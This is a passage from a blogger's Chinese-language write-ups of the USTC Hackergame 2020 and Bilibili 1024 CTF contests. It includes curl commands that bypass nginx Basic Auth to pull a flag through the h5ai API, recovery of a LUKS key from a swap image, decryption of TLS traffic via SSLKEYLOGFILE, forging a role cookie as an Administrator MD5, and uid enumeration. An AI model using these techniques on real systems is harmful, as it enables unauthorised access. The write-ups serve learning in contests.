<span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span 